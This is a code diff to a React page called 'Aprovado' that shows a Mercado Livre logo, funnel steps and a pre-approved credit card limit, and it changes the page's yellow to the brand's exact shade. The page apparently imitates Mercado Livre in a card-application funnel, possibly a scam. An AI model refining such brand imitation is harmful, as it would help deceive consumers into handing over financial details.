@@ -46,14 +46,14 @@ function Aprovado() {
   return (
     <div className="min-h-screen bg-white flex flex-col relative overflow-hidden">
       {/* Header */}
-      <div className="bg-[#F4D147] w-full py-3 flex justify-center items-center shadow-sm">
+      <div className="bg-[#FFE600] w-full py-3 flex justify-center items-center shadow-sm">
         <img src={mlLogo} alt="Mercado Livre" className="h-9 object-contain" />
       </div>
       <FunnelSteps current={2} />
 
       {/* Decorative circles */}
-      <div className="absolute w-72 h-72 rounded-full bg-[#F4D147]/20 -top-20 -right-20 z-0" />
-      <div className="absolute w-56 h-56 rounded-full bg-[#F4D147]/10 -bottom-16 -left-16 z-0" />
+      <div className="absolute w-72 h-72 rounded-full bg-[#FFE600]/20 -top-20 -right-20 z-0" />
+      <div className="absolute w-56 h-56 rounded-full bg-[#FFE600]/10 -bottom-16 -left-16 z-0" />
 
       <main className="flex-1 flex items-start justify-center px-4 py-8 relative z-10">
         <div className="w-full max-w-md bg-white rounded-xl shadow-md p-6 md:p-8">
@@ -64,7 +64,7 @@ function Aprovado() {
             Agora é só finalizar seu cartão e começar a aproveitar
           </p>
 
-          <div className="rounded-xl bg-gradient-to-br from-[#F4D147] to-[#1E5BBA] text-white p-5 mb-6 text-center shadow-md">
+          <div className="rounded-xl bg-gradient-to-br from-[#FFE600] to-[#1E5BBA] text-white p-5 mb-6 text-center shadow-md">
             <p className="text-[11px] uppercase tracking-wider opacity-90">Limite aprovado</p>
             <p className="text-3xl font-extrabold mt-1 tabular-nums">
               R$ {limite.toLocaleString("pt-BR")},00
@@ -78,7 +78,7 @@ function Aprovado() {
                 key={item.text}
                 className="flex items-start gap-3 border border-gray-200 rounded-lg p-4"
               >
-                <span className="w-10 h-10 rounded-lg bg-[#F4D147] flex items-center justify-center shrink-0">
+                <span className="w-10 h-10 rounded-lg bg-[#FFE600] flex items-center justify-center shrink-0">
                   <i className={`fas ${item.icon} text-gray-800`} />
                 </span>
                 <p className="text-sm text-gray-800 leading-snug pt-1">{item.text}</p>
@@ -88,7 +88,7 @@ function Aprovado() {
 
           <button
             onClick={() => navigate({ to: "/limite" })}
-            className="w-full bg-[#F4D147] hover:bg-[#E5C238] text-gray-900 text-lg font-semibold py-4 rounded-md transition-all"
+            className="w-full bg-[#FFE600] hover:bg-[#E6CF00] text-gray-900 text-lg font-semibold py-4 rounded-md transition-all"
           >
             Continuar
           </button>
